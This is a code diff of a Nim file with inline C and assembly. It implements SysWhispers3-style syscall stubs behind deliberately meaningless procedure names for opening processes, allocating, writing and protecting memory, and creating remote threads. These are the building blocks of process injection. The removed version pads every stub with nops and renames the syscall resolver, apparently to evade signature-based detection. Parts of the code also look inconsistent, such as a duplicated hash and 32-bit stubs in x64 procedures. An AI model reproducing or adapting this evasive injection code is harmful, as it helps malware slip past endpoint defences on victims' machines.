@@ -2,29 +2,6 @@
 
 import winim/lean
 
-
-
-# Additional typedefs
-type
-  PS_ATTR_UNION* {.pure, union.} = object
-    Value*: ULONG
-    ValuePtr*: PVOID
-  PS_ATTRIBUTE* {.pure.} = object
-    Attribute*: ULONG 
-    Size*: SIZE_T
-    u1*: PS_ATTR_UNION
-    ReturnLength*: PSIZE_T
-  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
-  PS_ATTRIBUTE_LIST* {.pure.} = object
-    TotalLength*: SIZE_T
-    Attributes*: array[2, PS_ATTRIBUTE]
-  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
-  KNORMAL_ROUTINE* {.pure.} = object
-    NormalContext*: PVOID
-    SystemArgument1*: PVOID
-    SystemArgument2*: PVOID
-  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
-
 {.emit: """
 #pragma once
 
@@ -36,7 +13,7 @@ type
 
 #include <windows.h>
 
-#define SW3_SEED 0x6BE5F2CD
+#define SW3_SEED 0x3C3804A6
 #define SW3_ROL8(v) (v << 8 | v >> 24)
 #define SW3_ROR8(v) (v >> 8 | v << 24)
 #define SW3_ROX8(v) ((SW3_SEED % 2) ? SW3_ROL8(v) : SW3_ROR8(v))
@@ -81,10 +58,11 @@ typedef struct _SW3_PEB {
 
 DWORD SW3_HashSyscall(PCSTR FunctionName);
 BOOL SW3_PopulateSyscallList();
-EXTERN_C DWORD Piep_GetSyNumber(DWORD FunctionHash);
+EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash);
 EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
 EXTERN_C PVOID internal_cleancall_wow64_gate(VOID);
 #endif
+#define JUMPER
 
 #include <stdio.h>
 
@@ -140,11 +118,11 @@ PVOID SC_Address(PVOID NtApiAddress)
 
    #ifdef _WIN64
     // If the process is 64-bit on a 64-bit OS, we need to search for syscall
-    BYTE syscall_code[] = { 0xcd, 0x00, 0x2e,0x00, 0xc3 };
+    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
     ULONG distance_to_syscall = 0x12;
    #else
     // If the process is 32-bit on a 32-bit OS, we need to search for sysenter
-    BYTE syscall_code[] = { 0x0f,0x00, 0x34,0x00, 0xc3 };
+    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
     ULONG distance_to_syscall = 0x0f;
    #endif
 
@@ -152,7 +130,9 @@ PVOID SC_Address(PVOID NtApiAddress)
     // If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
     if (local_is_wow64())
     {
-    
+    #ifdef DEBUG
+        printf("[+] Running 32-bit app on x64 (WOW64)\n");
+    #endif
 // JUMP_TO_WOW32Reserved
     }
   #endif
@@ -164,6 +144,9 @@ PVOID SC_Address(PVOID NtApiAddress)
     if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
     {
         // we can use the original code for this system call :)
+        #if defined(DEBUG)
+            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
+        #endif
         return SyscallAddress;
     }
 
@@ -172,27 +155,36 @@ PVOID SC_Address(PVOID NtApiAddress)
 
     for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
     {
-
+        // let's try with an Nt* API below our syscall
         SyscallAddress = SW3_RVA2VA(
             PVOID,
             NtApiAddress,
             distance_to_syscall + num_jumps * 0x20);
         if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
         {
+        #if defined(DEBUG)
+            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
+        #endif
             return SyscallAddress;
         }
 
-
+        // let's try with an Nt* API above our syscall
         SyscallAddress = SW3_RVA2VA(
             PVOID,
             NtApiAddress,
             distance_to_syscall - num_jumps * 0x20);
         if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
         {
+        #if defined(DEBUG)
+            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
+        #endif
             return SyscallAddress;
         }
     }
 
+#ifdef DEBUG
+    printf("Syscall Opcodes not found!\n");
+#endif
 
     return NULL;
 }
@@ -213,7 +205,8 @@ BOOL SW3_PopulateSyscallList()
     PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
     PVOID DllBase = NULL;
 
-
+    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
+    // in the list, so it's safer to loop through the full list and find it.
     PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
     for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
     {
@@ -290,7 +283,7 @@ BOOL SW3_PopulateSyscallList()
     return TRUE;
 }
 
-EXTERN_C DWORD Piep_GetSyNumber(DWORD FunctionHash)
+EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
 {
     // Ensure SW3_SyscallList is populated.
     if (!SW3_PopulateSyscallList()) return -1;
@@ -338,348 +331,203 @@ EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
 
 """.}
 
+type
+  PS_ATTR_UNION* {.pure, union.} = object
+    Value*: ULONG
+    ValuePtr*: PVOID
+  PS_ATTRIBUTE* {.pure.} = object
+    Attribute*: ULONG 
+    Size*: SIZE_T
+    u1*: PS_ATTR_UNION
+    ReturnLength*: PSIZE_T
+  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
+  PS_ATTRIBUTE_LIST* {.pure.} = object
+    TotalLength*: SIZE_T
+    Attributes*: array[2, PS_ATTRIBUTE]
+  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
 
 
-#NtProtectVirtualMemory
+
+# NtProtectVirtualMemory
 proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx
-    nop
-    nop
-    nop          
-	mov [rsp+16], rdx
-	nop
-    mov [rsp+24], r8
-	nop
-    nop
-    nop
-    mov [rsp+32], r9
-	sub rsp, 0x28
-	nop
-    nop
-    nop
-    mov ecx, 0x0B131CBD3
-	nop
-    nop
-    call Piep_GetSyNumber              
-	nop
-    add rsp, 0x28
-	nop
-    nop
-    mov rcx, [rsp+8]                      
-	nop
-    nop
-    nop
-    nop
-    mov rdx, [rsp+16]
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov r8, [rsp+24]
-	nop
-    mov r9, [rsp+32]
-	nop
-    mov r10, rcx
-	nop
-    syscall                    
-	ret
+		push ebp
+		mov ebp, esp
+		push '007973501h'                  
+		call SW3_GetRandomSyscallAddress        
+		mov edi, eax                           
+		push '007973501h'        
+		call SW3_GetSyscallNumber
+		lea esp, [esp+4]
+		mov ecx, 0x05
+	push_argument1:
+		dec ecx
+		push [ebp + 8 + ecx * 4]
+		jnz push_argument1
+		mov ecx, eax
+		mov eax, ecx
+		push ret_address_epilog1
+		call do_sysenter_interrupt1
+		lea esp, [esp+4]
+	ret_address_epilog1:
+		mov esp, ebp
+		pop ebp
+		ret
+	do_sysenter_interrupt1:
+		mov edx, esp
+		jmp edi
+		ret
     """
-#NtWriteVirtualMemory
+# NtWriteVirtualMemory
 proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov [rsp+16], rdx
-	nop
-    nop
-    mov [rsp+24], r8
-	nop
-    nop
-    nop
-    nop
-    mov [rsp+32], r9
-	sub rsp, 0x28
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov ecx, 0x0FC9FE831
-	nop
-    nop
-    call Piep_GetSyNumber              
-	nop
-    add rsp, 0x28
-	nop
-    nop
-    nop
-    nop
-    mov rcx, [rsp+8]                      
-	nop
-    mov rdx, [rsp+16]
-	nop
-    mov r8, [rsp+24]
-	nop
-    mov r9, [rsp+32]
-	nop
-    mov r10, rcx
-	nop
-    nop
-    nop
-    syscall                    
-	ret
+		push ebp
+		mov ebp, esp
+		push '0018E0501h'                  
+		call SW3_GetRandomSyscallAddress        
+		mov edi, eax                           
+		push '0018E0501h'        
+		call SW3_GetSyscallNumber
+		lea esp, [esp+4]
+		mov ecx, 0x05
+	push_argument2:
+		dec ecx
+		push [ebp + 8 + ecx * 4]
+		jnz push_argument2
+		mov ecx, eax
+		mov eax, ecx
+		push ret_address_epilog2
+		call do_sysenter_interrupt2
+		lea esp, [esp+4]
+	ret_address_epilog2:
+		mov esp, ebp
+		pop ebp
+		ret
+	do_sysenter_interrupt2:
+		mov edx, esp
+		jmp edi
+		ret
     """
-#NtCreateThreadEx
+# NtCreateThreadEx
 proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
-	nop
-    mov [rsp+16], rdx
-	nop
-    mov [rsp+24], r8
-	nop
-    mov [rsp+32], r9
-	nop
-    sub rsp, 0x28
-	mov ecx, 0x096BECC7C
-	nop
-    call Piep_GetSyNumber              
-	nop
-    add rsp, 0x28
-	mov rcx, [rsp+8]                      
-	nop
-    mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	nop
-    mov r9, [rsp+32]
-	nop
-    mov r10, rcx
-	nop
-    nop
-    syscall                    
-	nop
-    nop
-    ret
+		push ebp
+		mov ebp, esp
+		push '0C02C9C08h'                  
+		call SW3_GetRandomSyscallAddress        
+		mov edi, eax                           
+		push '0C02C9C08h'        
+		call SW3_GetSyscallNumber
+		lea esp, [esp+4]
+		mov ecx, 0x0b
+	push_argument3:
+		dec ecx
+		push [ebp + 8 + ecx * 4]
+		jnz push_argument3
+		mov ecx, eax
+		mov eax, ecx
+		push ret_address_epilog3
+		call do_sysenter_interrupt3
+		lea esp, [esp+4]
+	ret_address_epilog3:
+		mov esp, ebp
+		pop ebp
+		ret
+	do_sysenter_interrupt3:
+		mov edx, esp
+		jmp edi
+		ret
     """
-#NtAllocateVirtualMemory
+
+# NtAllocateVirtualMemory
 proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx
-    nop
-    nop
-    nop          
-	mov [rsp+16], rdx
-	nop
-    nop
-    nop
-    nop
-    mov [rsp+24], r8
-	nop
-    nop
-    nop
-    mov [rsp+32], r9
-	nop
-    nop
-    nop
-    nop
-    nop
-    sub rsp, 0x28
-	nop
-    nop
-    nop
-    mov ecx, 0x0CE55C4D1
-	nop
-    nop
-    call Piep_GetSyNumber              
-	nop
-    nop
-    nop
-    nop
-    nop
-    add rsp, 0x28
-	nop
-    nop
-    nop
-    mov rcx, [rsp+8]                      
-	nop
-    nop
-    nop
-    mov rdx, [rsp+16]
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov r8, [rsp+24]
-	nop
-    nop
-    mov r9, [rsp+32]
-	nop
-    nop
-    nop
-    nop
-    mov r10, rcx
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    syscall                    
-	nop
-    nop
-    nop
-    nop
-    ret
+		push ebp
+		mov ebp, esp
+		push '08F959302h'                  
+		call SW3_GetRandomSyscallAddress        
+		mov edi, eax                           
+		push '08F959302h'        
+		call SW3_GetSyscallNumber
+		lea esp, [esp+4]
+		mov ecx, 0x06
+	push_argument4:
+		dec ecx
+		push [ebp + 8 + ecx * 4]
+		jnz push_argument4
+		mov ecx, eax
+		mov eax, ecx
+		push ret_address_epilog4
+		call do_sysenter_interrupt4
+		lea esp, [esp+4]
+	ret_address_epilog4:
+		mov esp, ebp
+		pop ebp
+		ret
+	do_sysenter_interrupt4:
+		mov edx, esp
+		jmp edi
+		ret
     """
-#opqiwepoausdasdjlenProcess
+# NtOpenProcess
 proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx
-    nop
-    nop
-    nop
-    nop          
-	mov [rsp+16], rdx
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov [rsp+24], r8
-	mov [rsp+32], r9
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    sub rsp, 0x28
-	mov ecx, 0x001DF2A40
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    call Piep_GetSyNumber              
-	nop
-    nop
-    nop
-    nop
-    add rsp, 0x28
-	mov rcx, [rsp+8]                      
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    mov rdx, [rsp+16]
-	nop
-    nop
-    nop
-    nop
-    mov r8, [rsp+24]
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov r9, [rsp+32]
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov r10, rcx
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    syscall                    
-	nop
-    nop
-    nop
-    ret
+		push ebp
+		mov ebp, esp
+		push '0FDA3DE0Fh'                  
+		call SW3_GetRandomSyscallAddress        
+		mov edi, eax                           
+		push '0FDA3DE0Fh'        
+		call SW3_GetSyscallNumber
+		lea esp, [esp+4]
+		mov ecx, 0x04
+	push_argument5:
+		dec ecx
+		push [ebp + 8 + ecx * 4]
+		jnz push_argument5
+		mov ecx, eax
+		mov eax, ecx
+		push ret_address_epilog5
+		call do_sysenter_interrupt5
+		lea esp, [esp+4]
+	ret_address_epilog5:
+		mov esp, ebp
+		pop ebp
+		ret
+	do_sysenter_interrupt5:
+		mov edx, esp
+		jmp edi
+		ret
     """
 # NtClose
-proc zuatzuastdiasyy*(ProcessHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
+proc zuatzuastdiasyy*(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx
-    nop
-    nop
-    nop
-    nop          
-	mov [rsp+16], rdx
-    nop
-    nop
-    nop
-	mov [rsp+24], r8
-    nop
-    nop
-    nop
-    nop
-	mov [rsp+32], r9
-	sub rsp, 0x28
-    nop
-    nop
-    nop
-    nop
-    nop
-	mov ecx, 0x001DF2A40
-    nop
-    nop
-    nop
-	call Piep_GetSyNumber              
-	add rsp, 0x28
-    nop
-    nop
-    nop
-    nop
-	mov rcx, [rsp+8]                      
-	nop
-    mov rdx, [rsp+16]
-	nop
-    nop
-    nop
-    nop
-    nop
-    mov r8, [rsp+24]
-	nop
-    nop
-    nop
-    mov r9, [rsp+32]
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    mov r10, rcx
-	nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    nop
-    syscall                    
-	nop
-    nop
-    ret
+		push ebp
+		mov ebp, esp
+		push '0495CBB45h'                  
+		call SW3_GetRandomSyscallAddress        
+		mov edi, eax                           
+		push '0495CBB45h'        
+		call SW3_GetSyscallNumber
+		lea esp, [esp+4]
+		mov ecx, 0x01
+	push_argument6:
+		dec ecx
+		push [ebp + 8 + ecx * 4]
+		jnz push_argument6
+		mov ecx, eax
+		mov eax, ecx
+		push ret_address_epilog6
+		call do_sysenter_interrupt6
+		lea esp, [esp+4]
+	ret_address_epilog6:
+		mov esp, ebp
+		pop ebp
+		ret
+	do_sysenter_interrupt6:
+		mov edx, esp
+		jmp edi
+		ret
     """
+
 
